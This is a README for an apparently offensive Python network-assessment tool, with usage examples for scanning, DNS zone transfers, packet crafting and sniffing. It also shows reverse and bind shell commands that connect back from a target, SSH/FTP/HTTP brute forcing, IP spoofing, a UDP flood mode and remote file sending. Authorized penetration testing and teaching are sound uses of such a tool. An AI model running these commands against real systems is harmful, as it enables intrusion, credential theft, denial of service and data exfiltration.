# Cyber_NetCAT — Network Security Assessment Tool

```
 ██████╗██╗   ██╗██████╗ ███████╗██████╗      ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗     ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝     ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗     ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
╚██████╗   ██║   ██████╔╝███████╗██║  ██║     ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
```

A comprehensive, fully CLI-based Python tool for network security assessment and penetration testing. Built by **cyber**.

> ⚠️ **DISCLAIMER**: This tool is intended for **authorized security testing and educational purposes only**. Unauthorized use against systems you do not own or have explicit permission to test is **illegal**.

---

## 📦 Installation

```bash
# Clone the repository
cd cyber_netcat

# Create virtual environment
python -m venv venv_netcat
# Windows
venv_netcat\Scripts\activate
# Linux/Mac
source venv_netcat/bin/activate

# Install core dependencies
pip install -r requirements.txt

# Install with all optional dependencies (SSH brute force, advanced packets)
pip install -r requirements.txt paramiko scapy
```

---

## 🚀 Quick Start

```bash
# Run with python module syntax
python -m netcat_tool --help

# Or install as package
pip install -e .
netcat-tool --help
```

### Global Options

| Flag | Description |
|------|-------------|
| `-V, --version` | Show version |
| `-v, --verbose` | Enable debug output |
| `-o, --output FILE` | Save results to JSON |
| `--timeout SECS` | Connection timeout (default: 2.0) |
| `--no-banner` | Suppress startup banner |

---

## 📋 Commands

### 1. `scan` — Port Scanner

TCP/UDP port scanning with multi-threading and service detection.

```bash
# Scan common ports on a target
python -m netcat_tool scan -t 192.168.1.1

# Scan specific port range
python -m netcat_tool scan -t 192.168.1.1 -p 1-1000 --threads 200

# UDP scan
python -m netcat_tool scan -t 192.168.1.1 -p 53,161,162 --udp

# Scan a CIDR range
python -m netcat_tool scan -t 192.168.1.0/24 -p 22,80,443

# SYN stealth scan (requires admin)
python -m netcat_tool scan -t 192.168.1.1 -p 1-1000 --syn

# Save results to JSON
python -m netcat_tool scan -t 192.168.1.1 -p common -o scan_results.json
```

### 2. `banner` — Banner Grabber

Grab service banners to identify software versions.

```bash
# Basic banner grab
python -m netcat_tool banner -t 192.168.1.1 -p 21,22,80,443

# With protocol-specific probes
python -m netcat_tool banner -t example.com -p 80,443 --probe
```

### 3. `dns` — DNS Enumeration

DNS record lookups, subdomain brute force, and zone transfers.

```bash
# Standard DNS lookup
python -m netcat_tool dns -d example.com --type A,MX,NS,TXT

# Subdomain enumeration
python -m netcat_tool dns -d example.com --subdomains

# Subdomain enum with custom wordlist
python -m netcat_tool dns -d example.com --subdomains --wordlist wordlist.txt

# Zone transfer attempt
python -m netcat_tool dns -d example.com --zone-transfer

# Reverse DNS lookup
python -m netcat_tool dns -d example.com --reverse 8.8.8.8

# All DNS operations
python -m netcat_tool dns -d example.com --type A,AAAA,MX,NS,TXT,SOA --subdomains --zone-transfer
```

### 4. `recon` — Network Reconnaissance

Host discovery, traceroute, and OS fingerprinting.

```bash
# Ping sweep
python -m netcat_tool recon --sweep 192.168.1.0/24 --threads 100

# Traceroute
python -m netcat_tool recon --traceroute 8.8.8.8

# OS detection
python -m netcat_tool recon --os-detect 192.168.1.1

# List network interfaces
python -m netcat_tool recon --interfaces

# ARP scan
python -m netcat_tool recon --arp 192.168.1.0/24
```

### 5. `vulnscan` — Vulnerability Scanner

Check for known vulnerabilities, weak SSL, and insecure headers.

```bash
# Full vulnerability scan
python -m netcat_tool vulnscan -t 192.168.1.1 -p common --full

# SSL/TLS check only
python -m netcat_tool vulnscan -t example.com --ssl-check

# HTTP security headers only
python -m netcat_tool vulnscan -t example.com --headers

# CVE mapping on specific ports
python -m netcat_tool vulnscan -t 192.168.1.1 -p 21,22,80,443,3389 --cve
```

### 6. `craft` — Packet Crafter

Create and send custom TCP/UDP/ICMP packets.

```bash
# TCP SYN packet
python -m netcat_tool craft -t 192.168.1.1 -p 80 --tcp --flags SYN

# TCP with custom flags
python -m netcat_tool craft -t 192.168.1.1 -p 80 --tcp --flags SYN,ACK --count 5

# UDP packet with data
python -m netcat_tool craft -t 192.168.1.1 -p 53 --udp --data "test"

# ICMP ping
python -m netcat_tool craft -t 192.168.1.1 --icmp --count 10

# IP spoofing (requires admin)
python -m netcat_tool craft -t 192.168.1.1 -p 80 --tcp --spoof 10.0.0.1

# Flood mode (stress test - use responsibly!)
python -m netcat_tool craft -t 192.168.1.1 -p 80 --udp --flood
```

### 7. `shell` — Reverse/Bind Shell

Reverse shell listener/client and bind shell operations.

```bash
# Start reverse shell listener
python -m netcat_tool shell --listen -p 4444

# Connect back (run on target)
python -m netcat_tool shell --connect 192.168.1.100 -p 4444

# Encrypted reverse shell
python -m netcat_tool shell --listen -p 4444 --encrypt --key MySecretKey

# Bind shell
python -m netcat_tool shell --bind -p 4444
```

### 8. `transfer` — File Transfer

Send/receive files over TCP with integrity verification.

```bash
# Start receiver (on destination)
python -m netcat_tool transfer --receive -p 5555 --output-dir ./received

# Send file (from source)
python -m netcat_tool transfer --send secret.pdf -t 192.168.1.100 -p 5555

# Compressed transfer
python -m netcat_tool transfer --send largefile.zip -t 192.168.1.100 -p 5555 --compress
```

### 9. `brute` — Brute Force

Authentication testing for SSH, FTP, and HTTP.

```bash
# SSH brute force
python -m netcat_tool brute --ssh -t 192.168.1.1 -u admin -w wordlists/common_passwords.txt

# FTP brute force
python -m netcat_tool brute --ftp -t 192.168.1.1 -u anonymous -w wordlists/common_passwords.txt

# HTTP Basic Auth brute force
python -m netcat_tool brute --http -t 192.168.1.1 -u admin -w wordlists/common_passwords.txt --url /admin

# With custom threading and delay
python -m netcat_tool brute --ssh -t 192.168.1.1 -u root -w passwords.txt --threads 8 --delay 1.0
```

### 10. `sniff` — Traffic Analyzer

Capture and analyze live network traffic.

```bash
# Basic capture (50 packets)
python -m netcat_tool sniff --count 50

# Filter by protocol
python -m netcat_tool sniff --filter tcp --count 100

# With hex dump
python -m netcat_tool sniff --filter udp --count 20 --hex

# HTTP traffic only
python -m netcat_tool sniff --filter http --count 50

# DNS traffic
python -m netcat_tool sniff --filter dns --count 30

# Save capture
python -m netcat_tool sniff --count 100 --save capture.json --stats
```

---

## 📁 Project Structure

```
cyber_netcat/
├── netcat_tool/
│   ├── __init__.py          # Package info
│   ├── __main__.py          # python -m entry point
│   ├── main.py              # CLI dispatcher
│   ├── cli_parser.py        # Argument definitions
│   ├── utils/
│   │   ├── colors.py        # ANSI color helpers
│   │   ├── logger.py        # Logging config
│   │   ├── validators.py    # Input validation
│   │   └── banner.py        # ASCII banner
│   └── modules/
│       ├── port_scanner.py      # TCP/UDP scanning
│       ├── banner_grabber.py    # Service banners
│       ├── dns_enum.py          # DNS enumeration
│       ├── network_recon.py     # Host discovery
│       ├── vuln_scanner.py      # Vulnerability checks
│       ├── packet_crafter.py    # Custom packets
│       ├── reverse_shell.py     # Shell operations
│       ├── file_transfer.py     # File send/receive
│       ├── brute_force.py       # Auth testing
│       └── traffic_analyzer.py  # Packet capture
├── wordlists/
│   └── common_passwords.txt
├── requirements.txt
├── setup.py
└── README.md
```

---

## 🔧 Dependencies

| Package | Required | Used For |
|---------|----------|----------|
| `dnspython` | ✅ Core | DNS record lookups, zone transfers |
| `requests` | ✅ Core | HTTP header checks, HTTP brute force |
| `paramiko` | ⬜ Optional | SSH brute force module |
| `scapy` | ⬜ Optional | Advanced packet crafting |

---

## ⚖️ Legal Notice

This tool is designed for:
- Security professionals conducting authorized penetration tests
- Network administrators testing their own infrastructure
- Students learning about network security concepts

**You are solely responsible for your actions.** The developers assume no liability for misuse. Always obtain proper authorization before testing any systems.

---

## 📄 License

For authorized and educational use. By **cyber**. 
